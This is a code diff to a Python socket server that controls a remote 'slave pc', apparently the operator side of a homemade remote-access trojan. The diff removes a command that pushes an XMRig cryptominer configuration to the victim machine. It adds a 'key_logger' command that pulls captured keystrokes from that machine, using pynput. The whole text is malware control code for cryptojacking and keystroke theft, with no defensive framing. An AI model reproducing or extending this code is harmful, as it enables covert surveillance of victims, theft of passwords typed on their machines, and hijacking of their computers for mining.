@@ -1,5 +1,7 @@
 import socket
 import os
+import pynput
+
 
 
 s = socket.socket()
@@ -111,33 +113,12 @@ while 1 :
   
   
   
-  
-  elif command == "xmrig_config":
-    conn.send(command.encode())
-    print("Before you start minning on the slave pc you need to make a config file on using this url https://xmrig.com/wizard ")
-    file = input(str("please enter the filename and directory of the config file : "))
-    filename = input(str(r"Please enter the place where the config file will be saved the defualt/recommend is "))
-    data = open(file, "rb")
-    file_data = data.read(7000)
-    print(file, "has been sent successfully ")
-    conn.send(filename)
-    conn.send(file_data)    
- 
-  
-  
-  elif command == "config_test":
+  elif command == "key_logger":
       conn.send(command.encode())
-      f = open('config.json','rb')
-      print('Sending...')
-      l = f.read(1024)
-      while (l):
-           print('Sending...')
-           conn.send(l)
-           l = f.read(1024)
- 
-
-      
-      
+      alphpressedkeys = s.recv(5000)
+      speskeys = s.recv(5000)
+      print(alphpressedkeys)
+      print(speskeys)
       
       
       
